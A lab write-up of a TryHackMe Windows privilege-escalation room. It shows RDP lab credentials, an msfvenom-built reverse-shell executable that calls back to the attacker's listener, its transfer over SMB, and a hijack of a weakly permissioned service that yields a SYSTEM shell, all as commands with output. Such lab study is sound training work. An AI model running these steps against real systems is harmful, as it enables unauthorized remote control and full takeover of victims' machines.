# [Windows_PrivEsc](https://tryhackme.com/room/windows10privesc)

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 10.10.205.162  |
| Local IP          | 10.4.70.23   |
| Local listen port | 80 |

## Credentials

- RDP
  - user:password321

## RDP - 3389

- [x] login

```bash
â”Œâ”€â”€(l3ickeyðŸŽƒkali)-[~/l3ickey/pentest-cheat-sheet/thm/Windows_PrivEsc]
â””â”€$ xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.205.162

```

![image-20220803165658952](/home/funa/.config/Typora/typora-user-images/image-20220803165658952.png)

## Windows Privilege Escalation

### Generate a Reverse Shell Executable

On Kali, generate a reverse shell executable (`reverse.exe`) using msfvenom. Update the LHOST IP address accordingly:

```bash
â”Œâ”€â”€(l3ickeyðŸ‘½kali)-[~/l3ickey/pentest-cheat-sheet/thm/Windows_PrivEsc]
â””â”€$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.70.23 LPORT=53 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe

```

Transfer the `reverse.exe` file to the `C:\PrivEsc` directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.

On Kali, in the same directory as `reverse.exe`:

```bash
â”Œâ”€â”€(l3ickeyðŸ‘½kali)-[~/l3ickey/pentest-cheat-sheet/thm/Windows_PrivEsc]
â””â”€$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

On Windows (update the IP address with your Kali IP):

```powershell
C:\Users\user>copy \\10.4.70.23\kali\reverse.exe C:\PrivEsc\reverse.exe
        1 file(s) copied.

```

Test the reverse shell by setting up a netcat listener on Kali:

```bash
â”Œâ”€â”€(l3ickeyðŸŽƒkali)-[~/l3ickey/pentest-cheat-sheet/thm/Windows_PrivEsc]
â””â”€$ nc -nvlp 53
listening on [any] 53 ...

```

Then run the `reverse.exe` executable on Windows and catch the shell:

```powershell
C:\Users\user>C:\PrivEsc\reverse.exe

```

```bash
â”Œâ”€â”€(l3ickeyðŸŽƒkali)-[~/l3ickey/pentest-cheat-sheet/thm/Windows_PrivEsc]
â””â”€$ nc -nvlp 53
listening on [any] 53 ...
connect to [10.4.70.23] from (UNKNOWN) [10.10.205.162] 49821
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\user>whoami
whoami
win-qba94kb3iof\user

```

### Service Exploits - Insecure Service Permissions

Use `accesschk.exe` to check the "user" account's permissions on the "daclsvc" service:

```powershell
C:\Users\user>C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

```

Note that the "user" account has the permission to change the service config (`SERVICE_CHANGE_CONFIG`).

Query the service and note that it runs with SYSTEM privileges (`SERVICE_START_NAME`):

```powershell
C:\Users\user>sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```

Modify the service config and set the `BINARY_PATH_NAME` (binpath) to the `reverse.exe` executable you created:

```powershell
C:\Users\user>sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
[SC] ChangeServiceConfig SUCCESS

C:\Users\user>sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\PrivEsc\reverse.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```

Start a listener on Kali and then start the service to spawn a revers shell running with SYSTEM privileges:

```bash
â”Œâ”€â”€(l3ickeyðŸŽƒkali)-[~/l3ickey/pentest-cheat-sheet/thm/Windows_PrivEsc]
â””â”€$ nc -nvlp 53
listening on [any] 53 ...

```

 ```powershell
 C:\Users\user>net start daclsvc
 
 ```

```bash
â”Œâ”€â”€(l3ickeyðŸŽƒkali)-[~/l3ickey/pentest-cheat-sheet/thm/Windows_PrivEsc]
â””â”€$ nc -nvlp 53
listening on [any] 53 ...
connect to [10.4.70.23] from (UNKNOWN) [10.10.205.162] 49943
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```







